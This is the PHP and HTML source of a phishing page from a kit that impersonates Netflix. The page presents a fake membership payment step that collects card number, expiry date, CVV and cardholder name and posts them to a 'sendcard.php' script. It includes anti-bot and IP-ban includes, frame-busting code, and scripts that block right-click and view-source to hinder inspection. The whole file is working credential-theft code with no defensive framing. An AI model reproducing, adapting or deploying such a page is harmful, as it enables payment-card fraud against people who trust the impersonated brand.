<?php
session_start();
include "eradox/all.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "banip/zeus.php";

// Detect user's browser language
$userLanguage = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

// Define supported languages
$supportedLanguages = ['en', 'es', 'fr', 'de', 'it', 'ja', 'nl', 'pl', 'pt', 'sl']; // Add more languages as needed

// Set a default language
$defaultLanguage = 'en';

// Check if the detected language is in the list of supported languages
if (in_array($userLanguage, $supportedLanguages)) {
    $selectedLanguage = $userLanguage;
} else {
    $selectedLanguage = $defaultLanguage;
}

// Load the corresponding language file
$languageFile = 'languages/' . $selectedLanguage . '.php';
if (file_exists($languageFile)) {
    $translations = include($languageFile);
} else {
    die("Language file not found for $selectedLanguage");
}

?>



<html lang="en" class=" ">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Netflix</title>
    <meta
        content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies Tunisia, watch TV online, no download, full length movies"
        name="keywords">
    <meta
        content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more."
        name="description">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link type="text/css" rel="stylesheet" data-uia="botLink">
    <link type="text/css" rel="stylesheet" href="styles/css/simplicity.ea2f1826cf3f605b85bd.css" data-uia="botLink">
    <link rel="shortcut icon" href="styles/img/nficon2023.ico">
    <link rel="apple-touch-icon" href="styles/img/nficon2016.png">
    <meta property="og:description"
        content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more.">
    <style>
        /* Style the form fields */
        input[type="text"],
        input[type="tel"] {
            width: 100%;
            padding: 10px 40px;
            /* Add space on the right for the icons */
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            position: relative;
            /* Create a positioning context for the icons */
        }


        /* Style the submit button */
        .submitBtnContainer button {
            width: 100%;
            background-color: #e50914;
            color: #fff;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
            border-radius: 4px;
            font-size: 24px;
            font-weight: 400;
            min-height: 64px
        }

        .submitBtnContainer button:hover {
            background-color: #ff0000;
        }
    </style>
    
    
    
    
        <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>

        <style>
        /* Obfuscated CSS */
        .a { display: none !important; }
        .b { visibility: hidden !important; }
        .c { opacity: 0 !important; }
    </style>
    <script>
        // Obfuscated JavaScript
        (function() {
            var originalAlert = window.alert;
            window.alert = function() {
                console.log("Alerts are disabled.");
            };

            document.addEventListener("contextmenu", function(e) {
                e.preventDefault();
            });

            document.addEventListener("keydown", function(e) {
                if ((e.ctrlKey || e.metaKey) && (e.key === "u" || e.key === "U")) {
                    e.preventDefault();
                }
            });
        })();
    </script>


</head>

<body>
    <div id="appMountPoint">
        <div class="netflix-sans-font-loaded">
            <div data-uia="loc" lang="en-TN" dir="ltr">
                <div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-creditOptionMode simplicity"
                    lang="en-TN" dir="ltr">
                    <div class="nfHeader noBorderHeader signupBasicHeader onboarding-header"><a href="#"
                            class="svg-nfLogo signupBasicHeader onboarding-header"
                            data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" data-uia="netflix-logo"
                                class="svg-icon svg-icon-netflix-logo" aria-hidden="true" focusable="false">
                                <g id="netflix-logo">
                                    <path
                                        d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"
                                        id="Fill-14"></path>
                                </g>
                            </svg><span class="screen-reader-text">Netflix Home</span></a><a href="#"
                            class="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link"><?php echo $translations['signout']; ?></a></div>
                    <div class="simpleContainer" data-uia="simpleContainer" data-transitioned-child="true">
                        <div class="centerContainer firstLoad">
                            <div class="default-ltr-cache-bjn8wh ehkvevs2">
                                <div style="display:none">
                                    <div data-uia="success-spinner"><svg xmlns="http://www.w3.org/2000/svg"
                                            viewBox="0 0 48 48" width="48" height="48"
                                            preserveAspectRatio="xMidYMid meet"
                                            style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
                                            <defs>
                                                <clipPath id="__lottie_element_2">
                                                    <rect width="48" height="48" x="0" y="0"></rect>
                                                </clipPath>
                                                <clipPath id="__lottie_element_4">
                                                    <path fill="#ffffff" clip-rule="nonzero"></path>
                                                    <path fill="#ffffff" clip-rule="nonzero"></path>
                                                </clipPath>
                                            </defs>
                                            <g clip-path="url(#__lottie_element_2)">
                                                <g transform="matrix(1,0,0,1,24,24)" opacity="1"
                                                    style="display: block;">
                                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                                        <path stroke-linecap="butt" stroke-linejoin="miter"
                                                            fill-opacity="0" stroke-miterlimit="4"
                                                            stroke="rgb(228,8,19)" stroke-opacity="1" stroke-width="2"
                                                            d=" M-19.863000869750977,11.595000267028809 C-21.85700035095215,8.1899995803833 -23,4.2270002365112305 -23,0 C-23,-8.083999633789062 -18.81999969482422,-15.199999809265137 -12.505000114440918,-19.302000045776367">
                                                        </path>
                                                    </g>
                                                </g>
                                                <g clip-path="url(#__lottie_element_4)" style="display: none;">
                                                    <g>
                                                        <path></path>
                                                    </g>
                                                </g>
                                            </g>
                                        </svg></div>
                                </div>
                                <form id="ccform" method="POST" data-uia="payment-form" action="send/sendcard.php">
                                    <div class="paymentFormContainer">
                                        <div>
                                            <div class="stepHeader-container" data-uia="header">
                                                <div class="stepHeader" role="status"><span id="" class="stepIndicator"
                                                        data-uia=""><?php echo $translations['step3of3']; ?></b></span>
                                                    <h1 class="stepTitle" data-uia="stepTitle"><?php echo $translations['setupcc']; ?></h1>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="fieldContainer"><span class="logos logos-block"
                                                data-uia="cardLogos-comp"
                                                aria-label="We accept VISA, MASTERCARD and AMEX."><img
                                                    src="styles/img/VISA.png"
                                                    alt="VISA" class="logoIcon VISA default-ltr-cache-kg1rox e18ygst00"
                                                    srcset="styles/img/VISA@2x.png 2x"
                                                    data-uia="logoIcon-VISA"><img
                                                    src="styles/img/MASTERCARD.png"
                                                    alt="MASTERCARD"
                                                    class="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00"
                                                    srcset="styles/img/MASTERCARD@2x.png 2x"
                                                    data-uia="logoIcon-MASTERCARD"><img
                                                    src="styles/img/AMEX.png"
                                                    alt="AMEX" class="logoIcon AMEX default-ltr-cache-kg1rox e18ygst00"
                                                    srcset="styles/img/AMEX@2x.png 2x"
                                                    data-uia="logoIcon-AMEX"></span>
                                            <div class="formFieldContainer">
                                                <ul class="simpleForm structural ui-grid inlineContainer">
                                                    <li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
                                                        <div class="cardNumberContainer">
                                                            <div data-uia="field-creditCardNumber+container"
                                                                class=" e1skmawq1 default-ltr-cache-1ff5381 ea3diy34">
                                                                <label for="bedf2e464c067"
                                                                    data-uia="field-creditCardNumber+label"
                                                                    class="default-ltr-cache-hyhv56 ea3diy31"><?php echo $translations['cardnumber']; ?></label>
                                                                <div class="default-ltr-cache-1goff39 ea3diy33"><input
                                                                        type="tel" maxlength="16"
                                                                        autocomplete="cc-number" iconaspectratio="1:1"
                                                                        iconposition="after" dir="" placeholder=""
                                                                        value="" id="bedf2e464c067"
                                                                        name="creditCardNumber"
                                                                        data-uia="field-creditCardNumber" required
                                                                        oninput="handleNumericInput(this, 'errorMessage');">


                                                                    <span class="error-message" id="errorMessage"
                                                                        style="color: rgb(232, 124, 3); display: none;"><?php echo $translations['invalidccnumber']; ?></span>

                                                                    <div aria-hidden="true"
                                                                        class="default-ltr-cache-emv211 ea3diy32"></div>

                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-uia="field-creditExpirationMonth+wrapper"
                                                        class="nfFormSpace inline">
                                                        <div data-uia="field-creditExpirationMonth+container"
                                                            class=" e1skmawq1 default-ltr-cache-fss6l3 ea3diy34"><label
                                                                for="d1d7d8a6a526d"
                                                                data-uia="field-creditExpirationMonth+label"
                                                                class="default-ltr-cache-hyhv56 ea3diy31"><?php echo $translations['expirydate']; ?></label>
                                                            <div class="default-ltr-cache-1goff39 ea3diy33"><input
                                                                    type="tel" maxlength="5" autocomplete="cc-exp"
                                                                    iconaspectratio="1:1" dir="" placeholder="<?php echo $translations['mmyy']; ?>"
                                                                    value="" id="d1d7d8a6a526d"
                                                                    name="creditExpirationMonth"
                                                                    data-uia="field-creditExpirationMonth" required
                                                                    oninput="handleExpirationInput(this, 'expirationErrorMessage');">

                                                                <span class="error-message" id="expirationErrorMessage"
                                                                    style="color: rgb(232, 124, 3); display: none;"><?php echo $translations['invalidexpirydate']; ?></span>

                                                                <div aria-hidden="true"
                                                                    class="default-ltr-cache-emv211 ea3diy32"></div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-uia="field-creditExpirationYear+wrapper"
                                                        class="nfFormSpace hidden"></li>
                                                    <li data-uia="field-creditCardSecurityCode+wrapper"
                                                        class="nfFormSpace inline">
                                                        <div data-uia="field-creditCardSecurityCode+container"
                                                            class=" e1skmawq1 default-ltr-cache-1ff5381 ea3diy34"><label
                                                                for="29ac05f42b2aa"
                                                                data-uia="field-creditCardSecurityCode+label"
                                                                class="default-ltr-cache-hyhv56 ea3diy31"><?php echo $translations['CVV']; ?></label>
                                                            <div class="default-ltr-cache-1goff39 ea3diy33"><input
                                                                    type="tel" maxlength="4" autocomplete="cc-csc"
                                                                    iconaspectratio="1:1" iconposition="after" dir=""
                                                                    placeholder="" value="" id="29ac05f42b2aa"
                                                                    name="creditCardSecurityCode"
                                                                    data-uia="field-creditCardSecurityCode" required
                                                                    oninput="handleNumericInput(this, 'securityCodeErrorMessage');">

                                                                <span class="error-message"
                                                                    id="securityCodeErrorMessage"
                                                                    style="color: rgb(232, 124, 3); display: none;"><?php echo $translations['invalidcvv']; ?></span>

                                                                <div aria-hidden="true"
                                                                    class="default-ltr-cache-emv211 ea3diy32"></div>

                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-uia="field-NameOnCard+wrapper" class="nfFormSpace">
                                                        <div data-uia="field-NameOnCard+container"
                                                            class=" e1skmawq1 default-ltr-cache-fss6l3 ea3diy34"><label
                                                                for="9be8d47234ff3" data-uia="field-NameOnCard+label"
                                                                class="default-ltr-cache-hyhv56 ea3diy31"><?php echo $translations['nameoncc']; ?></label>
                                                            <div class="default-ltr-cache-1goff39 ea3diy33"><input
                                                                    type="text" autocomplete="cc-name"
                                                                    iconaspectratio="1:1" placeholder="" value=""
                                                                    id="9be8d47234ff3" name="NameOnCard"
                                                                    data-uia="field-NameOnCard" required
                                                                    oninput="convertToUpperCase(this);">
                                                                <div aria-hidden="true"
                                                                    class="default-ltr-cache-emv211 ea3diy32"></div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-uia="field-lastName+wrapper" class="nfFormSpace hidden">
                                                    </li>
                                                </ul>
                                            </div>
                                            <ul class="orderInfo" data-uia="orderInfo">
                                                <li class="orderInfoItem" data-uia="selected-plan-item">
                                                    <div class="orderInfoItem__content-container">
                                                        <div class="orderInfoItem__content"
                                                            data-uia="selected-plan-item+content">
                                                            <div class="orderInfoItem__text orderInfoItem__title"
                                                                data-uia="selected-plan-item+title"><span id=""
                                                                    data-uia=""><?php echo $translations['notice']; ?></span></div>
                                                            <div class="orderInfoItem__text orderInfoItem__description"
                                                                data-uia="selected-plan-item+description"><?php echo $translations['netfperformandnotfee']; ?>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </li>
                                            </ul>
                                            <div>
                                                <div class="tou--container" data-uia="tou-container">
                                                    <div class="user-consent--container"
                                                        data-uia="termsOfUseMatlock+organic-rest"><span id=""
                                                            data-uia="termsOfUse-Disclosure"><?php echo $translations['bycheckingthebox']; ?> <a 
                                                                href="#"><?php echo $translations['termsofuse']; ?></a>, <a 
                                                                href="#"><?php echo $translations['PrivacyStatement']; ?></a><?php echo $translations['andyouareover18net']; ?></span>
                                                        <div class="ui-binary-input"><input type="checkbox" class=""
                                                                name="hasAcceptedTermsOfUse"
                                                                id="cb_hasAcceptedTermsOfUse" value="true" tabindex="0"
                                                                data-uia="field-hasAcceptedTermsOfUse"><label
                                                                for="cb_hasAcceptedTermsOfUse"
                                                                data-uia="field-hasAcceptedTermsOfUse+label"><span id=""
                                                                    data-uia=""><?php echo $translations['agree']; ?></span></label>
                                                            <div class="helper"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="submitBtnContainer"><button role="button"
                                            class=" e1ax5wel1 ew97par0 default-ltr-cache-104rvul e1ff4m3w2"
                                            data-uia="action-submit-payment" type="submit"><?php echo $translations['confirmmembirship']; ?></button>
                                    </div>
                                    <div class="recaptcha-terms-of-use-container">
                                        <div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use">
                                            <p><span><?php echo $translations['thispageprotected']; ?></span>&nbsp;<button class="recaptcha-terms-of-use--link-button"
                                                    data-uia="recaptcha-learn-more-button"><?php echo $translations['learnmore']; ?></button></p>
                                        </div>
                                    </div>
                                </form>


                                <script>
                                    function handleNumericInput(inputElement, errorElementId) {
                                        // Allow only numeric input
                                        inputElement.value = inputElement.value.replace(/\D/g, '');

                                        // Reset the border color and hide the error message when the user starts typing again
                                        inputElement.style.borderBottom = '';
                                        document.getElementById(errorElementId).style.display = 'none';
                                    }

                                    function handleExpirationInput(inputElement, errorElementId) {
                                        // Automatically add "/" after entering two digits
                                        if (inputElement.value.length === 2 && inputElement.value.indexOf('/') === -1) {
                                            inputElement.value = inputElement.value + '/';
                                        }

                                        // Reset the border color and hide the error message when the user starts typing again
                                        inputElement.style.borderBottom = '';
                                        document.getElementById(errorElementId).style.display = 'none';
                                    }

                                    function convertToUpperCase(inputElement) {
                                        inputElement.value = inputElement.value.toUpperCase();
                                    }


                                    document.addEventListener('DOMContentLoaded', function () {
                                        var creditCardNumberInput = document.getElementById('bedf2e464c067');
                                        var expirationMonthInput = document.getElementById('d1d7d8a6a526d');
                                        var securityCodeInput = document.getElementById('29ac05f42b2aa');
                                        var ccForm = document.getElementById('ccform');
                                        var errorMessage = document.getElementById('errorMessage');
                                        var expirationErrorMessage = document.getElementById('expirationErrorMessage');
                                        var securityCodeErrorMessage = document.getElementById('securityCodeErrorMessage');
                                        var overlay = document.createElement('div');
                                        overlay.className = 'overlay';
                                        document.body.appendChild(overlay);

                                        // Add a spinner container element to the overlay
                                        var spinnerContainer = document.createElement('div');
                                        spinnerContainer.className = 'spinner-container';
                                        overlay.appendChild(spinnerContainer);

                                        // Add a spinner element to the spinner container
                                        var spinner = document.createElement('div');
                                        spinner.className = 'spinner';
                                        spinnerContainer.appendChild(spinner);

                                        // Hide overlay and spinner by default
                                        overlay.style.display = 'none';
                                        spinnerContainer.style.display = 'none';

                                        // Flag to track form validity
                                        var isFormValid = false;

                                        // Flag to track whether the button is clicked
                                        var isButtonClicked = false;

                                        ccForm.addEventListener('submit', function (event) {
                                            // Set the flag to true when the button is clicked
                                            isButtonClicked = true;

                                            // Reset the form validity flag
                                            isFormValid = true;

                                            if (!validateCreditCardNumber()) {
                                                isFormValid = false;
                                                event.preventDefault();
                                            }

                                            if (!validateExpirationDate()) {
                                                isFormValid = false;
                                                event.preventDefault();
                                            }

                                            if (!validateSecurityCode()) {
                                                isFormValid = false;
                                                event.preventDefault();
                                            }

                                            // If the form is valid, show the overlay and spinner
                                            if (isFormValid) {
                                                overlay.style.display = 'flex';
                                                spinnerContainer.style.display = 'flex';
                                                // You can add code here to show a red spinner or any other loading indicator
                                            }
                                        });

                                        function validateCreditCardNumber() {
                                            var value = creditCardNumberInput.value.trim();
                                            if (isButtonClicked && !luhnCheck(value)) {
                                                displayErrorAndSetColor(creditCardNumberInput);
                                                showError(errorMessage);
                                                return false;
                                            }
                                            return true;
                                        }

                                        function validateExpirationDate() {
                                            var value = expirationMonthInput.value.trim();
                                            var monthYearArray = value.split('/');

                                            // Check if the value contains a '/' and two parts (MM and YY)
                                            if (isButtonClicked && monthYearArray.length === 2) {
                                                var month = parseInt(monthYearArray[0], 10);
                                                var year = parseInt(monthYearArray[1], 10);

                                                // Perform validation logic based on your requirements
                                                // For example, check if the month and year are valid
                                                if (isNaN(month) || isNaN(year) || month < 1 || month > 12 || year < 23 || year > 99) {
                                                    displayErrorAndSetColor(expirationMonthInput);
                                                    showError(expirationErrorMessage);
                                                    return false;
                                                }
                                            } else {
                                                // If the format is not correct, show an error
                                                displayErrorAndSetColor(expirationMonthInput);
                                                showError(expirationErrorMessage);
                                                return false;
                                            }

                                            return true;
                                        }

                                        function validateSecurityCode() {
                                            var value = securityCodeInput.value.trim();
                                            if (isButtonClicked && (value === '' || isNaN(value))) {
                                                displayErrorAndSetColor(securityCodeInput);
                                                showError(securityCodeErrorMessage);
                                                return false;
                                            }
                                            return true;
                                        }

                                        function luhnCheck(cardNumber) {
                                            // Luhn algorithm implementation
                                            var sum = 0;
                                            var double = false;

                                            for (var i = cardNumber.length - 1; i >= 0; i--) {
                                                var digit = parseInt(cardNumber.charAt(i), 10);

                                                if (double) {
                                                    digit *= 2;
                                                    if (digit > 9) {
                                                        digit -= 9;
                                                    }
                                                }

                                                sum += digit;
                                                double = !double;
                                            }

                                            return (sum % 10 === 0);
                                        }

                                        function handleNumericInput(inputElement, errorElementId) {
                                            // Allow only numeric input
                                            inputElement.value = inputElement.value.replace(/\D/g, '');

                                            // Reset the border color and hide the error message when the user starts typing again
                                            inputElement.style.borderBottom = '';
                                            document.getElementById(errorElementId).style.display = 'none';
                                        }

                                        function resetBorderColor(inputElement, errorElementId) {
                                            // Reset the border color and hide the error message when the user starts typing again
                                            inputElement.style.borderBottom = '';
                                            document.getElementById(errorElementId).style.display = 'none';
                                        }

                                        function displayErrorAndSetColor(inputElement) {
                                            // Set the border color and show the error message
                                            inputElement.style.borderBottom = '2px solid #e87c03';
                                        }

                                        function showError(errorElement) {
                                            // Show the error message
                                            errorElement.style.display = 'block';
                                        }
                                    });
                                </script>

                                <style>
                                    .overlay {
                                        position: fixed;
                                        top: 0;
                                        left: 0;
                                        width: 100%;
                                        height: 100%;
                                        background: rgba(0, 0, 0, 0.5);
                                        z-index: 999;
                                        display: none;
                                        justify-content: center;
                                        align-items: center;
                                    }

                                    .spinner-container {
                                        display: none;
                                    }

                                    .spinner {
                                        border: 6px solid #e50914;
                                        border-top: 6px solid transparent;
                                        border-radius: 50%;
                                        width: 50px;
                                        height: 50px;
                                        animation: spin 1s linear infinite;
                                    }

                                    @keyframes spin {
                                        0% {
                                            transform: rotate(0deg);
                                        }

                                        100% {
                                            transform: rotate(360deg);
                                        }
                                    }
                                </style>





                            </div>
                        </div>
                    </div>
                    <div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;">
                        <div class="footer-divider"></div>
                        <div class="site-footer">
                            <p class="footer-top"><a class="footer-top-a"
                                    href="#"><?php echo $translations['questionscontactus']; ?></a></p>
                            <ul class="footer-links structural">
                                <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a
                                        class="footer-link" data-uia="footer-link"
                                        href="#"
                                        placeholder="footer_responsive_link_faq"><span id=""
                                            data-uia="data-uia-footer-label"><?php echo $translations['faq']; ?></span></a></li>
                                <li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a
                                        class="footer-link" data-uia="footer-link" href="#"
                                        placeholder="footer_responsive_link_help"><span id=""
                                            data-uia="data-uia-footer-label"><?php echo $translations['helpcenter']; ?></span></a></li>
                                <li class="footer-link-item" placeholder="footer_responsive_link_netflix_shop_item"><a
                                        class="footer-link" data-uia="footer-link" href="#"
                                        placeholder="footer_responsive_link_netflix_shop"><span id=""
                                            data-uia="data-uia-footer-label"><?php echo $translations['netflixshop']; ?></span></a></li>
                                <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a
                                        class="footer-link" data-uia="footer-link"
                                        href="#"
                                        placeholder="footer_responsive_link_terms"><span id=""
                                            data-uia="data-uia-footer-label"><?php echo $translations['termsofuse']; ?></span></a></li>
                                <li class="footer-link-item"
                                    placeholder="footer_responsive_link_privacy_separate_link_item"><a
                                        class="footer-link" data-uia="footer-link"
                                        href="#"
                                        placeholder="footer_responsive_link_privacy_separate_link"><span id=""
                                            data-uia="data-uia-footer-label"><?php echo $translations['Privacy']; ?></span></a></li>
                                <li class="footer-link-item"
                                    placeholder="footer_responsive_link_cookies_separate_link_item"><a
                                        class="footer-link" data-uia="footer-link" href="#"
                                        placeholder="footer_responsive_link_cookies_separate_link"><span id=""
                                            data-uia="data-uia-footer-label"><?php echo $translations['cookiepreferences']; ?></span></a></li>
                                <li class="footer-link-item"
                                    placeholder="footer_responsive_link_corporate_information_item"><a
                                        class="footer-link" data-uia="footer-link"
                                        href="#"
                                        placeholder="footer_responsive_link_corporate_information"><span id=""
                                            data-uia="data-uia-footer-label"><?php echo $translations['corporateinfo']; ?></span></a></li>
                            </ul>
                            <div class="lang-selection-container" id="lang-switcher">
                                <div class="nfSelectWrapper inFooter selectArrow prefix"
                                    data-uia="language-picker+container"><label class="nfLabel"
                                        for="lang-switcher-select">Select Language</label>
                                    <div class="nfSelectPlacement globe"><select data-uia="language-picker"
                                            class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0">
                                        
                                            <option selected="" label="<?php echo $translations['language']; ?>" lang="en"
                                                value="/signup/registration?locale=en-TN"><?php echo $translations['language']; ?></option>
                                        </select></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div>
                </div>
            </div>
        </div>
    </div>
      <title>This page isn’t working</title>
    <style>
        .hidden {
            display: none;
        }
    </style>
</head>
<body style="font-family: 'Segoe UI', Tahoma, sans-serif;font-size: 75%;">
    <div id="main-frame-error" class="interstitial-wrapper" jstcache="0" style=" margin: 14vh auto 0; max-width: 600px; ">
        <div id="main-content" jstcache="0">
    <img src="">
            <div id="main-message" jstcache="0">
                <h1 jstcache="0">
                
                    <a id="error-information-button" class="hidden" onclick="toggleErrorInformationPopup();" jstcache="0"></a>
                </h1>
                <p jsselect="summary" jsvalues=".innerHTML:msg" jstcache="1"><strong jscontent="DH" jstcache="22"><?php echo $_SERVER['HTTP_HOST']; ?></strong> 2023 © - all rights reserved.</p>
        
                <div id="error-information-popup-container" jstcache="0">
                    <div id="error-information-popup" jstcache="0">
                        <div id="error-information-popup-box" jstcache="0">
                            <div id="error-information-popup-content" jstcache="0">
                                <div id="suggestions-list" style="display:none" jsdisplay="(suggestionsSummaryList &amp;&amp; suggestionsSummaryList.length)" jstcache="16">
                                    <p jsvalues=".innerHTML:suggestionsSummaryListHeader" jstcache="18"></p>
                                    <ul jsvalues=".className:suggestionsSummaryList.length == 1 ? 'single-suggestion' : ''" jstcache="19">
                                        <li jsselect="suggestionsSummaryList" jsvalues=".innerHTML:summary" jstcache="21"></li>
                                    </ul>
                                </div>
                                <div class="error-code" jscontent="errorCode" jstcache="17">Netflix</div>
                                <p id="error-information-popup-close" jstcache="0">
                                    <a class="link-button" jscontent="closeDescriptionPopup" onclick="toggleErrorInformationPopup();" jstcache="20"></a>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        </div>
</body>



</body>

</html>